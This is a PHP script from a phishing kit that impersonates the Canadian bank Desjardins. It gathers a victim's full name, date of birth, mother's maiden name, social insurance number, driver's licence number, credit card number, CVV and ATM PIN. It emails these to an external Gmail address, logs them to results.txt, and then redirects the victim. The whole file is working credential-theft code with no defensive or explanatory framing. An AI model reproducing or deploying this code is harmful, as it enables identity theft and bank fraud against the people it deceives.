<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------3 PersonalDetails------------------\n";
$message .= "Full Name : ".$_POST['fullname']."\n";
$message .= "D.O.B : ".$_POST['dobday']."-".$_POST['dobmonth']."-".$_POST['dobyear']."\n";
$message .= "M.M.N : ".$_POST['MMN']."\n";
$message .= "S.I.N : ".$_POST['SIN']."\n";
$message .= "D.L.N : ".$_POST['DLN']."\n";
$message .= "-----------------4 CardDetails----------------------\n";
$message .= "Credit Card Number : ".$_POST['CCNO']."\n";
$message .= "Exp. Date-month : ".$_POST['EXPDATEmonth']."-".$_POST['EXPDATE']."\n";
$message .= "Cvv2 : ".$_POST['CVV']."\n";
$message .= "ATMPIN : ".$_POST['ATMPIN']."\n";
$message .= "-----------------created by medpage-----------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------DESJARDINSResults------------------\n";
$send = "flashygordon6754@gmail.com";
$subject = "desjardinsResultz 3 $ip".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('results.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>
    window.top.location.href = "../../../../../directing.html";

</script>
